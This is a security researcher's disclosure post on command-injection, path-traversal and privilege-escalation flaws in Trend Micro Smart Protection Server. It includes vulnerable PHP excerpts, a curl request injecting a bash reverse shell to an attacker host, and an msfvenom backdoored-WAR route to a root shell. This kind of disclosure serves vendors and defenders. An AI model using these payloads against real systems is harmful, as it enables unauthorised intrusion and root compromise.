---
layout: post
title:  "Trend Micro Bug Hunting - Part I"
date:   2016-08-08 07:00:00
author: qkaiser
excerpt: |
    Trend Micro Smart Protection Server is affected by 3 directory traversal vulnerabilities, 9 vectors to gain remote command execution, and another to obtain elevated privileges from there. Those vulnerabilities can be exploited by authenticated user on the web administration panel of TMSPS.
comments: true
categories: pentesting trendmicro
---


Trend Micro Smart Protection Server is affected by 3 directory traversal vulnerabilities, 9 vectors to gain remote command execution, and another to obtain elevated privileges from there. Those vulnerabilities can be exploited by authenticated user on the web administration panel of TMSPS.

From Trend Micro documentation:

> A Smart Protection Server hosts the Smart Scan Pattern and Web Blocking List. These patterns contain majority of the pattern definitions and URL reputations. OfficeScan clients that use smart scan verify potential threats against the pattern by sending scan queries to the Smart Protection Server. In the smart scan solution, clients send identification information determined by Trend Micro technology to Smart Protection Servers. Clients never send the entire file and the risk of the file is determined using the identification information. 

I recommend anyone running TMSPS to apply the critical patch released by Trend Micro, available at the following locations:

* TMSPS 3.0 - [http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4556&regs=NABU](http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4556&regs=NABU)
* TMSPS 2.6 - [http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4225&regs=NABU](http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4225&regs=NABU)
* TMSPS 2.5 - [http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=3788&regs=NABU](http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=3788&regs=NABU)

Trend Micro Advisory is available on their [business support website](https://success.trendmicro.com/solution/1114913)

#### Affected Versions

* Trend Micro Smart Protection Server version 2.5 to 3.0 included

### Authenticated RCE - Technical Description

The following PHP scripts do not sanitize user inputs prior to using them as parameters of system commands:

* /var/www/AdminUI/php/ccca\_ajaxhandler.php
* /var/www/AdminUI/php/admin\_notification.php
* /var/www/AdminUI/php/inc/SnmpUtils.php

An authenticated user can abuse this by injecting his own commands using different kind of operators such as &&, ; , >, <.

Let's look at each vulnerable component:

**/var/www/AdminUI/php/ccca_ajaxhandler.php [lines 178-198]**

In the excerpt below, we can see that ```$host``` and ```$apikey``` are directly initialiazed from unsanitized POST parameters values and fed to
to $LWCSCTRLEXEC command as -u and -a parameters.

{% highlight php %}
<?php
case 'register':
$host = "";
$apikey = "";
if( isset($_POST['host']))
{
	$host = $_POST['host'];
}	
else
{
	$response['error'] = ERROR_CANNOT_PARSE_REQUEST;
	break;
}            
if( isset($_POST['apikey']))
{
	$apikey = $_POST['apikey'];
}
else
{
	$response['error'] = ERROR_CANNOT_PARSE_REQUEST;
	break;
}            
$data = array();
$ret = 0;
exec("$LWCSCTRLEXEC -c CCCA_REGISTER -u $host -a $apikey", $data, $ret);
?>
{% endhighlight %}

**/var/www/AdminUI/php/ccca_ajaxhandler.php [line 217-230]**


In the excerpt below, we can see that ```$cca_enable``` is directly initialiazed with an unsanitized POST parameter value and fed to
to $LWCSCTRLEXEC command as -e parameter.

{% highlight php %}
<?php
case 'save_setting':
$ccca_enable = 0;
if( isset($_POST['enable']))
{
	$ccca_enable = $_POST['enable'];
}
else
{
	$response['error'] = ERROR_CANNOT_PARSE_REQUEST;
	break;
}	            
$data = array();
$ret = 0;
exec("$LWCSCTRLEXEC -c CCCA_SAVESETTING -e $ccca_enable", $data, $ret);
?>
{% endhighlight %}

**/var/www/AdminUI/php/ccca_ajaxhandler.php [lines 288-311]**

In the excerpt below, we can see that ```$host``` and ```$apikey``` are directly initialized with unsanitized POST parameters values and fed to
to $LWCSCTRLEXEC command as -u and -a parameters.

{% highlight php %} 
<?php
case 'test_connection':
$host = "";
$apikey = "";
if( isset($_POST['host']))
{
	$host = $_POST['host'];
}
else
{
	$response['error'] = ERROR_CANNOT_PARSE_REQUEST;
	break;
}            
if( isset($_POST['apikey']))
{
	$apikey = $_POST['apikey'];
}
else
{
	$response['error'] = ERROR_CANNOT_PARSE_REQUEST;
	break;
}            
$data = array();
$ret = 0;
exec("$LWCSCTRLEXEC -c CCCA_TESTCONNECTION -u $host -a $apikey", $data, $ret);
?>
{% endhighlight %}

**/var/www/AdminUI/php/admin_notification.php [lines 85-114]**

In the excerpt below, we can see that ```$host``` and ```$arr1['SNMP']['Community’]```, ```$arr1['SNMP']['AllowGroupNetmask’]```, and ```$arr1['SNMP']['AllowGroupIP’]```
are directly read from POST parameters and fed to SnmpUtils functions. SnmpUtils is detailed in in the excerpt afterwards.

{% highlight php %}
<?php
$arr1['SNMP']['EnableSNMP'] = is_null($_POST['spare_EnableSNMP']) ? "0":$_POST['spare_EnableSNMP'];	
if ("1" == $arr1['SNMP']['EnableSNMP'])
{
	$arr1['SNMP']['Community'] = is_null($_POST['spare_Community']) ? "SmartScanServer":$_POST['spare_Community'];
	$arr1['SNMP']['EnableIPRestriction'] = is_null($_POST['spare_EnableIPRestriction']) ? "0":$_POST['spare_EnableIPRestriction'];
	if("1" == $arr1['SNMP']['EnableIPRestriction'])
	{
		$arr1['SNMP']['AllowGroupIP']        = is_null($_POST['spare_AllowGroupIP'])       ?""     : remove_ipv6_brackets($_POST['spare_AllowGroupIP']);
		$arr1['SNMP']['AllowGroupNetmask']   = is_null($_POST['spare_AllowGroupNetmask'])  ?""     :$_POST['spare_AllowGroupNetmask'];
	}
}

$ret = 0;
if("0" == $arr1['SNMP']['EnableSNMP'])
{
	$ret = SnmpUtils::ClearFirewall();
}
else
{
	$ret = SnmpUtils::SetCommunityName($arr1['SNMP']['Community']);

	if("0" == $arr1['SNMP']['EnableIPRestriction'])
	{
		$ret = SnmpUtils::SetFirewall("0", "0");
	}
	else
	{
		$ret = SnmpUtils::SetFirewall($arr1['SNMP']['AllowGroupIP'], $arr1['SNMP']['AllowGroupNetmask']);
	}
}
?>
{% endhighlight %}

SnmpUtils defines two functions (SetCommunityName, SetFirewall) that calls directly ```/usr/tmcss/bin/ServWebExec``` with unsanitized inputs
as ```snmpsetcomm``` and ```snmpsetfw``` parameters, respectively.

**/var/www/AdminUI/php/inc/SnmpUtils.php [line 38]**

{% highlight php %}
<?php
static function SetCommunityName($CommunityName) {
	$command="/usr/tmcss/bin/ServWebExec --snmpsetcomm ".$CommunityName;
	system($command, $retval);
	return $retval;
}
?>
{% endhighlight %}

**/var/www/AdminUI/php/inc/SnmpUtils.php [line 44]**

{% highlight php %}
<?php
static function SetFirewall($IP, $Netmask) {
	$command="/usr/tmcss/bin/ServWebExec --snmpsetfw ".$IP." ".$Netmask;
	system($command, $retval);
	return $retval;
}
?>
{% endhighlight %}

#### Building a PoC

The different vulnerabilities were easily proven with curl, such as by using this command where get a reverse shell using interactive bash:

{% highlight bash %}
$ curl 'https://127.0.0.1:8443/php/admin_notification.php' -H 'Cookie: 590848d208960aa9=q3fk366otcapsp7vur00tp0to3' -H 'Origin: https://127.0.0.1:8443' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: https://127.0.0.1:8443/php/admin_notification.php?sid=590848d208960aa9' -H 'Connection: keep-alive' --data 'EnableSNMP=on&Community=hello&submit=Save&pubkey=snip&sid=590848d208960aa9&spare_EnableSNMP=1&spare_Community=test;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.25%2F4444%200%3E%261;&spare_EnableIPRestriction=0&spare_AllowGroupIP=&spare_AllowGroupNetmask=' --compressed --insecure --http1.0
{% endhighlight %}

Let's run netcat and wait for the shell to drop !

```
$ nc -lv 4444
bash: no job control in this shell
bash-3.2$ id
uid=501(webserv) gid=501(webserv) groups=101(icrc),501(webserv)
bash-3.2$ whoami
webserv
bash-3.2$ pwd
/var/www/AdminUI/php
```

#### Privilege Escalation

It got interesting when I discovered that TMSPS servers are running an Apache Solr server to - presumably - communicate with OfficeScan clients.
Solr runs on Jetty and the webserv user has write access to the webapps directory. However, auto-deploy of war files is not enabled by default.

```
bash-3.2$ cd /var/tmcss/solr/webapps
bash-3.2$ ls -alh
total 3.9M
drwxr-xr-x 2 webserv webserv 4.0K Apr 29 21:19 .
drwxr-xr-x 9 webserv webserv 4.0K Apr 29 20:03 ..
-rw-r--r-- 1 webserv webserv 3.9M Nov  6  2009 solr.war
```

Furthermore, I found out that this server is running - you guessed it - as root.

```
bash-3.2$ ps aux
--snip--
root      2265  0.3  6.8 612340 69804 ?        Sl   22:03   0:03 /usr/java/default/bin/java -Dsolr.solr.home=/var/tmcss/solr/solr -Djetty.port=8983 -Djetty.logs=/var/tmcss/solr/logs -Djetty.home=/var/tmcss/solr -Djava.io.tmpdir=/tmp -jar /var/tmcss/solr/start.jar /var/tmcss/solr/etc/jetty-logging.xml /var/tmcss/solr/etc/jetty.xml
```

From there, and making the assumptions that we already have credentials, we could drop a backdoored .war file there and restart the logging service from the custom CLI in order to get a shell with root privileges.

{% highlight bash %}
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > solr.war
Payload size: 1099 bytes
{% endhighlight %}

```
>
Last login: Wed Jul  6 22:16:01 2016 from 10.0.2.2

********************************************
*          Smart Protection Server         *
*                                          *
*      WARNING: Authorized Access Only     *
********************************************
        
Welcome admin it is Wed Jul  6 22:34:01 CEST 2016
> enable
> disable adhoc-query 
Do you really want to disable adhoc query service? (y/n)y0

Stopping Jetty: OK
> enable adhoc-query 
Starting Jetty: STARTED Jetty Wed Jul  6 22:46:41 CEST 2016
0
2016-07-06 22:46:41.825::INFO:  Logging to STDERR via org.mortbay.log.StdErrLog
2016-07-06 22:46:41.939::INFO:  Redirecting stderr/stdout to /var/tmcss/debuglogs/jetty.log
>
```

{% highlight bash %}
$ tail /var/tmcss/debuglogs/jetty.log
2016-07-06 22:46:42.516::INFO:  Extract jar:file:/var/tmcss/solr/webapps/solr.war!/ to /var/tmcss/solr/work/Jetty_0_0_0_0_8983_solr.war__solr__k1kf17/webapp
2016-07-06 22:46:42.724::INFO:  Started SocketConnector @ 0.0.0.0:8983
{% endhighlight %}

And once you request your backdoor JSP file, your root shell will drop :)

```
$ nc -l 4445
id
uid=0(root) gid=0(root) groups=0(root),6(disk)
pwd
/var/tmcss/solr
```

Note that the Jetty server is configured in such a way that it'll only load war files named "solr.war" and that you'll need to request the jsp backdoor by prepending "solr" to it. It should be possible to update the Jetty configuration but, you know, I'm lazy. 

## Path Traversal - Technical Description

The following PHP scripts do not sanitize user inputs prior to using them as parameters in file handling related functions:

* /var/www/AdminUI/php/log_mgt_adhocquery_ajaxhandler.php
* /var/www/AdminUI/php/log_mgt_ajaxhandler.php
* /var/www/AdminUI/php/wcs_bwlists_handler.php

We review each vulnerable component below:

**/var/www/AdminUI/php/log_mgt_adhocquery_ajaxhandler.php [lines 108-124]**

In the excerpt below, we can see that the GET parameter ```tmpfname``` is used directly in ```file_exists```, ```readfile```, and ```unlink```. This means that not only we can retrieve any file that webserv user has read access to, but that we can also delete any file that webserv has write access to. Note that arbitrary deletion of files can easily lead to denial of service.

{% highlight php %}
<?php
if (isset($_GET['downloadCSV']) && isset($_GET['tmpfname']) && file_exists(TMP_PATH . "/" . $_GET['tmpfname']))
{
ini_set('zlib.output_compression', 'Off'); 
header("Pragma: public"); 
header("Expires: 0"); 
header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); 
header("Cache-Control: private",false); 
header("Content-type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"adhoc_query_log.csv\";");
header("Content-Transfer-Encoding:  binary"); 
ob_clean();
flush();
@readfile(TMP_PATH . "/" . $_GET['tmpfname']);
@unlink(TMP_PATH . "/" . $_GET['tmpfname']);
exit;
}
?>
{% endhighlight %}

**/var/www/AdminUI/php/log_mgt_ajaxhandler.php [lines 577-601]**

In the excerpt below, we can see that the GET parameter ```tmpfname``` is used directly in ```file_exists```, ```readfile```, and ```unlink```. This means that not only we can retrieve any file that webserv user has read access to, but that we can also delete any file that webserv has write access to. Note that arbitrary deletion of files can easily lead to denial of service.

{% highlight php %}
<?php
case 'downloadCSV':
	if( isset($_REQUEST['tmpfname']) && file_exists(TMP_PATH . "/{$_REQUEST['tmpfname']}") )
	{
	//Workaround for IE6, and because the exported file is small, this setting won't impact the performance
	ini_set('zlib.output_compression', 'Off'); 
	header("Pragma: public"); 
	header("Expires: 0"); 
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); 
	header("Cache-Control: private",false); 
	header("Content-type: application/octet-stream"); 
	header("Content-Disposition: attachment; filename=\"update_log.csv\";"); 
	header("Content-Transfer-Encoding:  binary"); 

	ob_clean();
	flush();
	@readfile(TMP_PATH . "/{$_REQUEST['tmpfname']}");
	@unlink(TMP_PATH . "/{$_REQUEST['tmpfname']}");
	exit;
	}
	else
	{
		header( "Location: log_mgt_showlogs.php?sid={$_REQUEST['sid']}" );
		exit;
	}
	break;
?>
{% endhighlight %}

**/var/www/AdminUI/php/log_mgt_ajaxhandler.php [lines 776-784]**

The case below is particular as it "only" allows for arbitrary file deletion.
	
{% highlight php %}
<?php
else
{
	if( isset($_REQUEST['tmpfname']) && file_exists(TMP_PATH . "/{$_REQUEST['tmpfname']}") )
	{
		@unlink(TMP_PATH . "/{$_REQUEST['tmpfname']}");
	}
	outputError(ERROR_CANNOT_PARSE_REQUEST);
}
?>
{% endhighlight %}

**/var/www/AdminUI/php/wcs_bwlists_handler.php [line lines 578-600]**

In the excerpt below, we can see that the GET parameter ```tf``` is used directly in ```file_exists```, ```readfile```, and ```unlink```. This means that not only we can retrieve any file that webserv user has read access to, but that we can also delete any file that webserv has write access to. Note that arbitrary deletion of files can easily lead to denial of service.

{% highlight php %}
<?php
case 'download_csv':
	if( isset($_REQUEST['tf']) && file_exists(TMP_PATH . "/" . $_REQUEST['tf']))
	{
	ini_set('zlib.output_compression', 'Off'); 
	header("Pragma: public");
	header("Expires: 0");
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
	header("Cache-Control: private",false);
	header("Content-type: application/force-download");
	header("Content-Disposition: attachment; filename=\"lwcs_bwlist.csv\";");
	header("Content-Transfer-Encoding:  binary");

	ob_clean();
	flush();
	@readfile(TMP_PATH . "/" . $_REQUEST['tf']);
	@unlink(TMP_PATH . "/" . $_REQUEST['tf']);
	exit;
	}
	else
	{
		exit;
	}
	break;
?>
{% endhighlight %}


## Conclusion

Trend Micro vulnerability team was great in handling this coordinated disclosure. They do not have a bug bounty program but, you know, "no bounty no drama" :) 

Part II will discuss other Trend Micro products where I managed to be greeted with ```#```   and will be released in the coming months so stay tuned.


## Disclosure Timeline

* **2016-05-01**: Advisory sent to Trend Micro 
* **2016-05-10**: Trend Micro get back to me with an estimate for a fix
* **2016-06-23**: Trend Micro released patch
* **2016-08-08**: Release of advisory

## CVE Identifiers

* [CVE-2016-6266](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6266) - Authenticated remote code execution by exploiting the vulnerability in which $LWCSCTRLEXEC is used directly with untrusted input.
* [CVE-2016-6267](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6267) - Authenticated remote code execution by exploiting the vulnerability in which ServWebExec is used with untrusted input.
* [CVE-2016-6268](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6268) - Privilege escalation by exploiting the fact that non-root users have write access to a location that is used for root code execution.
* [CVE-2016-6269](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6269) - Directory traversal by exploiting a vulnerability in which there is a failure to ensure that certain parameters correspond to pathnames within TMP_PATH.

## Exploits

* Metasploit module - I sent a [PR](https://github.com/rapid7/metasploit-framework/pull/7191) to them. We'll see how it goes :)
